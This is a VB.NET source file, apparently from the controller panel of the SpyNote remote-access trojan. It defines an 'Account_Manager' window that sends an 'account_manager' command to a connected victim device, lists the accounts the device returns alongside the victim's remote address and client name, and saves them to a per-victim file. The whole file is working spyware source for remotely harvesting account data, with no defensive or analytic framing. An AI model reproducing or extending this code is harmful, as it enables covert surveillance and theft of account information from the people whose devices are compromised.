Imports System.IO
Imports System.Text
Imports Microsoft.VisualBasic.CompilerServices
Imports Spy_Note.etonyps

Public Class Account_Manager
    Private imageList_0 As ImageList
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Public Sub New()
        Me.imageList_0 = New ImageList()
        Me.InitializeComponent()
    End Sub
    Public Sub Client_data(data As String)
        ' The following expression was wrapped in a checked-statement
        Try
            Dim flag As Boolean = data <> Nothing
            If flag Then
                Dim flag2 As Boolean = data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]")
                If flag2 Then
                    Dim separator As String() = New String() {"[My/Exception]"}
                    Dim array As String() = data.Split(separator, StringSplitOptions.RemoveEmptyEntries)
                    Me.Label1.Text = array(0)
                    Dim flag3 As Boolean = Not Me.Panel3.Visible
                    If flag3 Then
                        Me.Panel3.Visible = True
                    End If
                Else
                    Me.DataGridView1.Rows.Clear()
                    Dim separator2 As String() = New String() {My.Forms.Form1.s.split_Line}
                    Dim array2 As String() = data.Split(separator2, StringSplitOptions.RemoveEmptyEntries)
                    Dim stringBuilder As StringBuilder = New StringBuilder()
                    Dim num As Integer = array2.Length - 1
                    For i As Integer = 0 To num
                        Dim separator3 As String() = New String() {My.Forms.Form1.s.split_Ary}
                        Dim array3 As String() = array2(i).Split(separator3, StringSplitOptions.RemoveEmptyEntries)
                        Dim num2 As Integer = Me.imageList_0.Images.IndexOfKey(array3(0).ToUpper())
                        If num2 = -1 Then
                            num2 = Me.imageList_0.Images.IndexOfKey("account".ToUpper())
                        End If
                        Me.DataGridView1.Rows.Add(New Object() {Me.imageList_0.Images(num2), array3(0), array3(1)})
                        stringBuilder.AppendFormat("{0}", array3(0) + " , " + array3(1) + vbCrLf)
                    Next
                    store_0.Save_0(Me.Name_Client + Me.Client_ID + "\Account_Manager", stringBuilder.ToString())
                    Dim visible As Boolean = Me.Panel3.Visible
                    If visible Then
                        Me.Panel3.Visible = False
                    End If
                    Me.refres_title()
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub refres_title()
        Dim text As String = String.Format("Account Manager - Remote Address & Port: {0} Client Name: {1} - Item: {2} Item Selection: {3}", New Object() {Me.Client_remote_Address, Me.Name_Client, Conversions.ToString(Me.DataGridView1.Rows.Count), Conversions.ToString(Me.DataGridView1.SelectedRows.Count)})
        Me.Text = text
    End Sub

    Private Sub Account_Manager_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.RefreshToolStripMenuItem.Image = store_0.Bitmap_0("ctx_refresh")
        Me.ContextMenuStrip1.Renderer = New Theme_0()
        Dim flag As Boolean = False
        Dim files As String() = Directory.GetFiles(Application.StartupPath + "\" + store_0.name_folder_app_resource + "\icons\account_manager\")
        For Each text As String In files
            Dim flag2 As Boolean = Not flag
            If flag2 Then
                Me.icon_0.Width = Image.FromFile(text).Size.Width
                Me.imageList_0.ImageSize = New Size(Image.FromFile(text).Size.Width, Image.FromFile(text).Size.Height)
                Me.imageList_0.ColorDepth = ColorDepth.Depth32Bit
                flag = True
            End If
            Dim path As String = text
            Dim fileNameWithoutExtension As String = IO.Path.GetFileNameWithoutExtension(path)
            Me.imageList_0.Images.Add(fileNameWithoutExtension.ToUpper(), Image.FromFile(text))
        Next
        Me.refres_title()
        MyBase.Icon = store_0.icons_0("window")
    End Sub

    Private Sub DataGridView1_SelectionChanged(sender As Object, e As EventArgs) Handles DataGridView1.SelectionChanged
        Me.refres_title()
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "account_manager")
    End Sub
End Class